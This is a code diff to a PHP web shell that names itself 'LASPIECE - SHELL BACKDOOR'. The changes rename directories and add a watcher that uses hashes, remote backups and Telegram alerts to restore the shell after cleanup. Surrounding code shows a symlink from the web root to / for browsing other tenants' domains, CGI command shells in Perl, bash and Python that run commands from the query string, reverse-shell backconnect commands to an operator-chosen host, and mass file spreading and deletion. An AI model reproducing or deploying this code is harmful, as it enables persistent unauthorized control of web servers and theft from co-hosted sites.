@@ -933,6 +933,8 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
 
     if ($fAct === 'create_symlink') {
         $symMode = isset($_POST['sym_mode']) ? $_POST['sym_mode'] : 'file';
+
+        // ── File/Dir symlink (like alfa SymFile) ──────────────────────────
         if ($symMode === 'file') {
             $target   = isset($_POST['symlink_target']) ? $_POST['symlink_target'] : '';
             $linkName = isset($_POST['symlink_name'])   ? $_POST['symlink_name']   : '';
@@ -958,24 +960,30 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
             }
             exit;
         }
+
+        // ── Symlink PHP (like alfa symphp) — sym root, list all domains ──
         if ($symMode === 'symphp') {
-            $dataDir = dirname(__FILE__) . '/lastpiecesymlink';
+            $dataDir = dirname(__FILE__) . '/alfasymlink';
             @mkdir($dataDir, 0777, true);
+            // Write .htaccess bypass to allow direct access
             $htaccess = $dataDir . '/.htaccess';
             if (!file_exists($htaccess)) {
                 @file_put_contents($htaccess, "Options +Indexes\nOptions +FollowSymLinks\nDirectoryIndex None\n");
             }
+            // Create symlink root -> /
             $rootLink = $dataDir . '/root';
             if (!is_link($rootLink)) {
                 $ok = false;
                 if (function_exists('symlink')) $ok = @symlink('/', $rootLink);
                 if (!$ok) { @shell_exec("ln -s / " . escapeshellarg($rootLink)); @exec("ln -s / " . escapeshellarg($rootLink)); $ok = is_link($rootLink); }
             } else { $ok = true; }
+            // Read domains from server
             $baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
             $scriptPath = str_replace($_SERVER['DOCUMENT_ROOT'], '', __FILE__);
             $scriptDir  = dirname($scriptPath);
-            $symlinkBase = $baseUrl . $scriptDir . '/lastpiecesymlink/root';
+            $symlinkBase = $baseUrl . $scriptDir . '/alfasymlink/root';
             $rows = array();
+            // Try /etc/named.conf or /etc/valiases
             $domains = array(); $state = '';
             if (@file_exists('/etc/named.conf') && @is_readable('/etc/named.conf')) {
                 $lines = @file('/etc/named.conf', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
@@ -989,10 +997,12 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
                 $named = @scandir('/var/named');
                 if ($named) { foreach ($named as $v) { if ($v !== '.' && $v !== '..') $domains[] = rtrim($v, '.db'); } $state = 'named'; }
             }
+            // Build domain rows
             if (!empty($domains)) {
                 foreach ($domains as $dom) {
                     $dom = trim($dom);
                     if (strlen($dom) < 3) continue;
+                    // Guess public_html path
                     $owner = '';
                     if (function_exists('posix_getpwuid') && function_exists('fileowner')) {
                         $f = '/etc/valiases/' . $dom;
@@ -1007,15 +1017,18 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
             echo json_encode(array('ok' => $ok, 'rows' => $rows, 'root_url' => $symlinkBase, 'msg' => $ok ? 'Root symlink ready' : 'symlink() disabled — trying shell'));
             exit;
         }
+
+        // ── Symlink Perl / Python (like alfa symperl/sympy) ──────────────
         if ($symMode === 'symperl' || $symMode === 'sympy') {
-            $dataDir = dirname(__FILE__) . '/cgilastpiece';
+            $dataDir = dirname(__FILE__) . '/cgialfa';
             @mkdir($dataDir, 0777, true);
             $htaccess = $dataDir . '/.htaccess';
             if (!file_exists($htaccess)) {
-                @file_put_contents($htaccess, "Options +ExecCGI\nAddHandler cgi-script .lastpiece .pl .py\nOptions +FollowSymLinks\n");
+                @file_put_contents($htaccess, "Options +ExecCGI\nAddHandler cgi-script .alfa .pl .py\nOptions +FollowSymLinks\n");
             }
             $makepwd = "/home/{user}/public_html/";
             $lang = ($symMode === 'sympy') ? 'python' : 'perl';
+            // Try to run via exec
             $canRun = false;
             foreach (array('system','exec','shell_exec','passthru') as $fn) { if (function_exists($fn)) { $canRun = true; break; } }
             $out = '';
@@ -1035,11 +1048,13 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
             }
             $baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
             $scriptDir = dirname(str_replace($_SERVER['DOCUMENT_ROOT'], '', __FILE__));
-            echo json_encode(array('ok' => true, 'output' => $out ?: 'Executed (no output)', 'base_url' => $baseUrl . $scriptDir . '/cgilastpiece/'));
+            echo json_encode(array('ok' => true, 'output' => $out ?: 'Executed (no output)', 'base_url' => $baseUrl . $scriptDir . '/cgialfa/'));
             exit;
         }
+
         echo json_encode(array('err' => 'Unknown sym_mode')); exit;
     }
+
     if ($fAct === 'backconnect') {
         $bt = $_POST['bc_type'] ?? 'php';
         $bh = $_POST['bc_host'] ?? '';
@@ -1047,11 +1062,13 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
         if (!$bh || $bp < 1 || $bp > 65535) {
             echo json_encode(['err' => 'Valid host and port (1-65535) required']); exit;
         }
+        // Check disabled functions
         $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
         $availExec = [];
         foreach (['exec','shell_exec','system','passthru','popen','proc_open'] as $fn) {
             if (function_exists($fn) && !in_array($fn, $disabled)) $availExec[] = $fn;
         }
+
         $cmd = '';
         switch ($bt) {
             case 'perl':
@@ -1070,10 +1087,12 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
             case 'ruby':
                 $cmd = 'ruby -rsocket -e \'f=TCPSocket.open("'.$bh.'",'.$bp.').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\' &';
                 break;
-            default:
+            default: // PHP
                 if (!in_array('proc_open', $availExec)) {
+                    // Try fsockopen method
                     $sock = @fsockopen($bh, $bp, $en, $es, 10);
                     if (!$sock) { echo json_encode(['err' => "Connection failed: $es ($en)"]); exit; }
+                    // Simple PHP reverse shell via fsockopen
                     $sh = @popen('/bin/sh -i', 'r');
                     if (!$sh) {
                         @fclose($sock);
@@ -1092,6 +1111,8 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
                 }
                 echo json_encode(['ok' => true, 'msg' => "PHP backconnect established to $bh:$bp"]); exit;
         }
+
+        // Execute shell-based backconnect
         if (empty($availExec)) {
             echo json_encode(['err' => 'No exec functions available. Disabled: ' . ini_get('disable_functions')]); exit;
         }
@@ -1112,6 +1133,9 @@ if (isset($_POST['file_action']) && isAuthenticated()) {
     echo json_encode(['err' => 'unknown file action']);
     exit;
 }
+// === END FILE OPERATION HANDLER ===
+
+// === MASS DELETE BY CONTENT (form POST, result shown in terminal) ===
 if (isset($_POST['do_mass_delete']) && isAuthenticated()) {
     $code = isset($_POST['code_content']) ? $_POST['code_content'] : '';
     $dir  = isset($_POST['target_dir'])   ? trim($_POST['target_dir']) : '';
@@ -1199,11 +1223,13 @@ function lp_lock_load($lockStore) {
     if (!$lines) return $entries;
     foreach ($lines as $l) {
         $l = trim($l); if (!$l) continue;
-        $parts = explode('|', $l, 3);
+        $parts = explode('|', $l, 5);
         $entries[] = array(
             'path'       => $parts[0],
             'perm'       => isset($parts[1]) ? $parts[1] : '0444',
-            'backup_url' => isset($parts[2]) ? $parts[2] : ''
+            'backup_url' => isset($parts[2]) ? $parts[2] : '',
+            'baseline_size' => isset($parts[3]) ? intval($parts[3]) : 0,
+            'baseline_hash' => isset($parts[4]) ? trim($parts[4]) : '',
         );
     }
     return $entries;
@@ -1211,7 +1237,9 @@ function lp_lock_load($lockStore) {
 function lp_lock_save($lockStore, $entries) {
     $lines = array();
     foreach ($entries as $e) {
-        $lines[] = $e['path'] . '|' . $e['perm'] . '|' . $e['backup_url'];
+        $size = isset($e['baseline_size']) ? $e['baseline_size'] : 0;
+        $hash = isset($e['baseline_hash']) ? $e['baseline_hash'] : '';
+        $lines[] = $e['path'] . '|' . $e['perm'] . '|' . $e['backup_url'] . '|' . $size . '|' . $hash;
     }
     @file_put_contents($lockStore, $lines ? implode("\n", $lines) . "\n" : '');
 }
@@ -1523,7 +1551,7 @@ function lp_launch_watcher($phpWatchFile, $bashWatchFile, $pidFile) {
 if (isset($_GET['lp_watcher_tick'])) {
     ob_clean();
     header('Content-Type: application/json; charset=utf-8');
-    $watchDir  = dirname(__FILE__) . '/LASTPIECE_DATA';
+    $watchDir  = dirname(__FILE__) . '/LASPIECE_DATA';
     $lockStore = $watchDir . '/.lockfiles';
     if (!file_exists($lockStore)) { echo json_encode(array('ok'=>true,'restored'=>0)); exit; }
     $lines = @file($lockStore, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
@@ -1544,14 +1572,32 @@ if (isset($_GET['lp_watcher_tick'])) {
     $restored = 0; $log = array();
     foreach ($lines as $line) {
         $line = trim($line); if (!$line) continue;
-        $parts  = explode('|', $line, 3);
+        $parts  = explode('|', $line, 5);
         $target = trim($parts[0]);
         $perm   = isset($parts[1]) ? trim($parts[1]) : '0444';
         $bakUrl = isset($parts[2]) ? trim($parts[2]) : '';
+        $baselineSize = isset($parts[3]) ? intval($parts[3]) : 0;
+        $baselineHash = isset($parts[4]) ? trim($parts[4]) : '';
         $permInt = octdec($perm);
+        $baseline = array('size' => $baselineSize, 'hash' => $baselineHash);
         clearstatcache(true, $target);
+
+        // Check if file changed (missing OR content modified)
+        $fileChanged = lp_file_changed($target, $baseline);
+
+        // Check if parent folder is writable (permission issue)
+        $parentUnwriteable = false;
+        if (file_exists($target)) {
+            $dir = dirname($target);
+            if (is_dir($dir) && !is_writable($dir)) {
+                $parentUnwriteable = true;
+                // Try to fix parent permission
+                lp_ensure_parent_writable($target);
+            }
+        }
+
         if (!file_exists($target) && !is_link($target)) {
-            // -- Send "file missing" alert (throttled to once per 60s per file)
+            // -- FILE MISSING or PARENT UNWRITEABLE: Send alert & restore
             $tKey = md5($target);
             $lastAlert = isset($throttle[$tKey]) ? (int)$throttle[$tKey] : 0;
             if ($tgToken && $tgChatId && ($now - $lastAlert) > 60) {
@@ -1585,7 +1631,7 @@ if (isset($_GET['lp_watcher_tick'])) {
             }
             $dir = dirname($target);
             if (!is_dir($dir)) @mkdir($dir, 0755, true);
-            @chmod($dir, 0755);
+            lp_ensure_parent_writable($target); // Ensure parent is writable before writing
             $written = @file_put_contents($target, $content !== false ? $content : '');
             if ($written !== false) {
                 @chmod($target, $permInt);
@@ -1620,12 +1666,74 @@ if (isset($_GET['lp_watcher_tick'])) {
                     lp_telegram_send($tgToken, $tgChatId, $msg);
                 }
             }
+        } elseif ($fileChanged && !is_dir($target)) {
+            // -- CONTENT CHANGED: Alert & restore from backup
+            $tKey = md5($target . '_content');
+            $lastAlert = isset($throttle[$tKey]) ? (int)$throttle[$tKey] : 0;
+            if ($tgToken && $tgChatId && ($now - $lastAlert) > 60) {
+                $fname = basename($target);
+                $msg  = "<b>PERINGATAN: Isi File Berubah!</b>\n\n"
+                      . "<b>File:</b> <code>" . htmlspecialchars($fname) . "</code>\n"
+                      . "<b>Path:</b> <code>" . htmlspecialchars($target) . "</code>\n"
+                      . "<b>Perm terkunci:</b> <code>" . htmlspecialchars($perm) . "</code>\n\n"
+                      . "File yang seharusnya read-only terdeteksi ada perubahan. Mencoba restore dari backup...";
+                lp_telegram_send($tgToken, $tgChatId, $msg);
+                $throttle[$tKey] = $now;
+                $throttleChanged = true;
+            }
+
+            // -- Restore from backup
+            $content = '';
+            if ($bakUrl) {
+                if (function_exists('curl_init')) {
+                    $ch = curl_init($bakUrl);
+                    curl_setopt_array($ch, array(CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>20,
+                        CURLOPT_FOLLOWLOCATION=>true, CURLOPT_SSL_VERIFYPEER=>false,
+                        CURLOPT_USERAGENT=>'Mozilla/5.0'));
+                    $content = curl_exec($ch); curl_close($ch);
+                }
+                if (!$content) {
+                    $ctx = @stream_context_create(array('http'=>array('method'=>'GET','timeout'=>20,
+                        'ignore_errors'=>true,'header'=>"User-Agent: Mozilla/5.0\r\n")));
+                    $content = @file_get_contents($bakUrl, false, $ctx);
+                }
+            }
+
+            // Make parent writable, write file, then re-lock
+            if ($content) {
+                lp_ensure_parent_writable($target);
+                @chmod($target, 0644); // Temporarily make writable
+                $written = @file_put_contents($target, $content);
+                @chmod($target, $permInt); // Re-lock
+                if ($written !== false) {
+                    $restored++;
+                    $log[] = 'content_restored: ' . $target;
+                    if ($tgToken && $tgChatId) {
+                        $fname = basename($target);
+                        $size  = filesize($target);
+                        $sizeStr = $size > 1024 ? round($size/1024, 1) . ' KB' : $size . ' B';
+                        $msg  = "<b>File Berhasil Di-Restore dari Backup!</b>\n\n"
+                              . "<b>File:</b> <code>" . htmlspecialchars($fname) . "</code>\n"
+                              . "<b>Path:</b> <code>" . htmlspecialchars($target) . "</code>\n"
+                              . "<b>Ukuran:</b> <code>" . $sizeStr . "</code>\n"
+                              . "<b>Status:</b> Re-locked dengan perm " . htmlspecialchars($perm) . "\n\n"
+                              . "<b>File Manager:</b> <a href=\"" . htmlspecialchars($pageUrl) . "\">" . htmlspecialchars($pageUrl) . "</a>";
+                        lp_telegram_send($tgToken, $tgChatId, $msg);
+                        unset($throttle[$tKey]);
+                        $throttleChanged = true;
+                    }
+                }
+            }
         } else {
-            // Enforce chmod
+            // File exists & unchanged: enforce chmod & parent writable
             $cur  = substr(sprintf('%o', @fileperms($target)), -4);
             $want = str_pad(ltrim($perm, '0'), 4, '0', STR_PAD_LEFT);
             if ($want === '0000') $want = '0444';
             if ($cur !== $want) @chmod($target, $permInt);
+            // Ensure parent stays writable if needed
+            if ($parentUnwriteable) {
+                lp_ensure_parent_writable($target);
+            }
         }
     }
     // Save throttle
@@ -1640,7 +1748,7 @@ if (isset($_POST['lock_action']) && isAuthenticated()) {
     ob_clean();
     header('Content-Type: application/json; charset=utf-8');
     $lockAction   = $_POST['lock_action'];
-    $watchDir     = dirname(__FILE__) . '/LASTPIECE_DATA';
+    $watchDir     = dirname(__FILE__) . '/LASPIECE_DATA';
     $lockStore    = $watchDir . '/.lockfiles';
     $phpWatchFile = $watchDir . '/lockwatcher.php';
     $shWatchFile  = $watchDir . '/lockwatcher.sh';
@@ -1700,9 +1808,16 @@ if (isset($_POST['lock_action']) && isAuthenticated()) {
         $backupUrl = '';
         if (!is_dir($path)) { $backupUrl = lp_upload_figma($path); }
 
-        // Upsert entry
+        // Upsert entry with baseline hash/size
         $entries = array_values(array_filter($entries, function($e) use ($path) { return $e['path'] !== $path; }));
-        $entries[] = array('path' => $path, 'perm' => $perm, 'backup_url' => $backupUrl);
+        $baseline = lp_file_baseline($path);
+        $entries[] = array(
+            'path'           => $path,
+            'perm'           => $perm,
+            'backup_url'     => $backupUrl,
+            'baseline_size'  => $baseline['size'],
+            'baseline_hash'  => $baseline['hash'],
+        );
         lp_lock_save($lockStore, $entries);
 
         // Apply chmod immediately
@@ -1776,9 +1891,16 @@ if (isset($_POST['lock_action']) && isAuthenticated()) {
             }
             $backupUrl = '';
             if (!is_dir($path)) { $backupUrl = lp_upload_figma($path); }
-            // Remove existing entry then add fresh
+            // Remove existing entry then add fresh with baseline
             $entries = array_values(array_filter($entries, function($e) use ($path) { return $e['path'] !== $path; }));
-            $entries[] = array('path' => $path, 'perm' => $perm, 'backup_url' => $backupUrl);
+            $baseline = lp_file_baseline($path);
+            $entries[] = array(
+                'path'           => $path,
+                'perm'           => $perm,
+                'backup_url'     => $backupUrl,
+                'baseline_size'  => $baseline['size'],
+                'baseline_hash'  => $baseline['hash'],
+            );
             @chmod($path, octdec($perm));
             $locked++;
             $results[] = array('path' => $path, 'ok' => true, 'backup_url' => $backupUrl);
@@ -1829,7 +1951,7 @@ if (isset($_POST['lock_action']) && isAuthenticated()) {
 
 // ── TELEGRAM NOTIFICATION HELPERS ────────────────────────────────────────
 function lp_tg_settings_file() {
-    return dirname(__FILE__) . '/LASTPIECE_DATA/.tg_settings';
+    return dirname(__FILE__) . '/LASPIECE_DATA/.tg_settings';
 }
 
 function lp_tg_settings_load() {
@@ -1889,6 +2011,34 @@ function lp_get_home_url() {
     $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
     return $scheme . '://' . $host . '/';
 }
+
+// ── CONTENT CHANGE DETECTION & PERMISSION HELPERS ──────────────────────────
+function lp_file_baseline($path) {
+    if (!file_exists($path) || is_dir($path)) return array('size' => 0, 'hash' => '');
+    $size = @filesize($path);
+    $hash = @md5_file($path);
+    return array('size' => $size ?: 0, 'hash' => $hash ?: '');
+}
+
+function lp_file_changed($path, $baseline) {
+    if (!is_array($baseline)) $baseline = array('size' => 0, 'hash' => '');
+    if (!file_exists($path)) return true; // missing = changed
+    $cur = lp_file_baseline($path);
+    return ($cur['size'] !== $baseline['size'] || $cur['hash'] !== $baseline['hash']);
+}
+
+function lp_ensure_parent_writable($path) {
+    $dir = dirname($path);
+    if (!is_dir($dir)) return false;
+    // Check if writable
+    if (is_writable($dir)) return true;
+    // Try to chmod to 0755 (Linux/Mac)
+    if (@chmod($dir, 0755)) return true;
+    // Try to chmod to 0777 (fallback)
+    if (@chmod($dir, 0777)) return true;
+    return false; // Could not make writable
+}
+// ── END CONTENT & PERMISSION HELPERS ──────────────────────────────────────
 
 function fetchHomepage() {
     $homeUrl = lp_get_home_url();
@@ -1980,7 +2130,7 @@ if (!isAuthenticated()) {
 </style>
 <div id="_lp_overlay">
 <form id="_lp_box" method="POST">
-<h3>LASTPIECE - SHELL BACKDOOR</h3>
+<h3>LASPIECE - SHELL BACKDOOR</h3>
 <p>Authentication Required</p>
 ' . ($loginError ? '<div id="_lp_err">' . htmlspecialchars($loginError) . '</div>' : '') . '
 <label>Password</label>
@@ -2589,13 +2739,19 @@ function massSpreadAuto($basePath, $content) {
     }
     return ['count' => $count, 'errors' => $errors, 'created' => $created];
 }
+
+
+
+// === LASPIECE CGI API AUTO-INIT (like ALFA_DATA/alfacgiapi) ===
 function lp_init_cgiapi() {
     $base   = dirname(__FILE__);
-    $data   = $base . '/LASTPIECE_DATA';
+    $data   = $base . '/LASPIECE_DATA';
     $cgidir = $data . '/lastpiececgiapi';
 
     @mkdir($data,   0755, true);
     @mkdir($cgidir, 0755, true);
+
+    // .htaccess — enable CGI execution for .lastpiece files (same as alfacgihtaccess 'cgi')
     $ht = $cgidir . '/.htaccess';
     if (!@file_exists($ht)) {
         $htContent  = "Options FollowSymLinks MultiViews Indexes ExecCGI\n";
@@ -2614,13 +2770,13 @@ function lp_init_cgiapi() {
         $perlSrc .= "my \$cmd = \$ENV{'QUERY_STRING'} || \$ENV{'HTTP_CMD'} || '';\n";
         $perlSrc .= "\$cmd =~ s/%([0-9A-Fa-f]{2})/chr(hex(\$1))/eg;\n";
         $perlSrc .= "if (\$cmd) {\n";
-        $perlSrc .= "    print \"[LASTPIECE-hacktivist]<pre>\";\n";
+        $perlSrc .= "    print \"[laspiece-hacktivist]<pre>\";\n";
         $perlSrc .= "    my \$out = '';\n";
         $perlSrc .= "    if (open(my \$fh, '-|', \$cmd . ' 2>&1')) {\n";
         $perlSrc .= "        while (<\$fh>) { \$out .= \$_; } close(\$fh);\n";
         $perlSrc .= "    }\n";
         $perlSrc .= "    print \$out;\n";
-        $perlSrc .= "    print \"</pre>[LASTPIECE-hacktivist]\";\n";
+        $perlSrc .= "    print \"</pre>[laspiece-hacktivist]\";\n";
         $perlSrc .= "}\n";
         @file_put_contents($perlFile, $perlSrc);
         @chmod($perlFile, 0755);
@@ -2633,9 +2789,9 @@ function lp_init_cgiapi() {
         $bashSrc .= "echo -e \"Content-Type: text/html\\n\"\n";
         $bashSrc .= "CMD=\$(echo \"\$QUERY_STRING\" | sed 's/%/\\\\x/g' | xargs -0 printf '%b' 2>/dev/null || echo \"\$QUERY_STRING\")\n";
         $bashSrc .= "if [ -n \"\$CMD\" ]; then\n";
-        $bashSrc .= "    echo '[LASTPIECE-hacktivist]<pre>'\n";
+        $bashSrc .= "    echo '[laspiece-hacktivist]<pre>'\n";
         $bashSrc .= "    eval \"\$CMD\" 2>&1\n";
-        $bashSrc .= "    echo '</pre>[LASTPIECE-hacktivist]'\n";
+        $bashSrc .= "    echo '</pre>[laspiece-hacktivist]'\n";
         $bashSrc .= "fi\n";
         @file_put_contents($bashFile, $bashSrc);
         @chmod($bashFile, 0755);
@@ -2654,13 +2810,13 @@ function lp_init_cgiapi() {
         $pySrc .= "print(\"\")\n";
         $pySrc .= "cmd = unquote(os.environ.get('QUERY_STRING', '') or os.environ.get('HTTP_CMD', ''))\n";
         $pySrc .= "if cmd:\n";
-        $pySrc .= "    print('[LASTPIECE-hacktivist]<pre>')\n";
+        $pySrc .= "    print('[laspiece-hacktivist]<pre>')\n";
         $pySrc .= "    try:\n";
         $pySrc .= "        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)\n";
         $pySrc .= "        sys.stdout.write(out.decode('utf-8', errors='replace'))\n";
         $pySrc .= "    except Exception as e:\n";
         $pySrc .= "        print(str(e))\n";
-        $pySrc .= "    print('</pre>[LASTPIECE-hacktivist]')\n";
+        $pySrc .= "    print('</pre>[laspiece-hacktivist]')\n";
         @file_put_contents($pyFile, $pySrc);
         @chmod($pyFile, 0755);
     }
@@ -2678,7 +2834,7 @@ if (isset($_GET['lph'])) {
     $currentDirectory = getCurrentDirectory();
 }
 
-// Auto-create LASTPIECE_DATA/lastpiececgiapi on every authenticated page load
+// Auto-create LASPIECE_DATA/lastpiececgiapi on every authenticated page load
 if (isAuthenticated()) {
     @lp_init_cgiapi();
 }
@@ -3931,6 +4087,7 @@ body {
             </span>
             <button class="modal-close" onclick="hideModal2('symlinkModal')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
         </div>
+        <!-- Tab bar same as alfafilemanager -->
         <div style="display:flex;gap:0;border-bottom:1px solid rgba(167,139,250,0.18);background:rgba(0,0,0,0.2);">
             <button id="symTab_php"    onclick="symSwitchTab('php')"    style="flex:1;padding:8px 4px;font-size:11px;background:rgba(167,139,250,0.18);color:#a78bfa;border:none;border-bottom:2px solid #a78bfa;cursor:pointer;font-weight:700;">Symlink (PHP)</button>
             <button id="symTab_perl"   onclick="symSwitchTab('perl')"   style="flex:1;padding:8px 4px;font-size:11px;background:transparent;color:var(--text-muted);border:none;border-bottom:2px solid transparent;cursor:pointer;">Symlink (Perl)</button>
@@ -3938,8 +4095,10 @@ body {
             <button id="symTab_file"   onclick="symSwitchTab('file')"   style="flex:1;padding:8px 4px;font-size:11px;background:transparent;color:var(--text-muted);border:none;border-bottom:2px solid transparent;cursor:pointer;">File Symlink</button>
         </div>
         <div class="modal-body" style="padding:16px;min-height:200px;max-height:68vh;overflow-y:auto;">
+
+            <!-- PHP tab -->
             <div id="symPane_php">
-                <p style="color:var(--text-muted);font-size:11px;margin-bottom:10px;">Buat symlink <code style="color:#a78bfa;">lastpiecesymlink/root -> /</code> lalu tampilkan semua domain di server beserta link langsung ke public_html.</p>
+                <p style="color:var(--text-muted);font-size:11px;margin-bottom:10px;">Buat symlink <code style="color:#a78bfa;">alfasymlink/root -> /</code> lalu tampilkan semua domain di server beserta link langsung ke public_html.</p>
                 <div style="display:flex;gap:8px;justify-content:center;margin-bottom:12px;">
                     <button class="btn" style="background:#a78bfa;border-color:#a78bfa;color:#fff;font-weight:600;" onclick="doSymlinkAction('symphp')">Run Symlink PHP</button>
                 </div>
@@ -4293,7 +4452,7 @@ body {
             </span>
             <button class="modal-close" onclick="hideModal2('lockManagerModal');if(_lockMgrPollTimer){clearInterval(_lockMgrPollTimer);_lockMgrPollTimer=null;}"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
         </div>
-        <div class="modal-body" style="padding:14px;min-height:120px;">
+        <div class="modal-body" style="padding:14px;min-height:120px;max-height:70vh;overflow-y:auto;">
             <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px;">
                 <div style="display:flex;align-items:center;gap:6px;">
                     <span id="lockMgrDot" style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#6b7280;"></span>
@@ -4352,8 +4511,8 @@ body {
                 Loading...
             </div>
             <table id="lockManagerTable" style="display:none;width:100%;border-collapse:collapse;font-size:11px;">
-                <thead>
-                <tr style="background:rgba(245,158,11,0.08);border-bottom:1px solid rgba(245,158,11,0.2);">
+                <thead style="position:sticky;top:0;background:rgba(245,158,11,0.08);z-index:10;">
+                <tr style="border-bottom:1px solid rgba(245,158,11,0.2);">
                     <th style="padding:7px 8px;text-align:left;color:#f59e0b;font-weight:600;">Path</th>
                     <th style="padding:7px 8px;text-align:center;color:var(--text-muted);font-weight:600;">Lock</th>
                     <th style="padding:7px 8px;text-align:center;color:var(--text-muted);font-weight:600;">Cur</th>
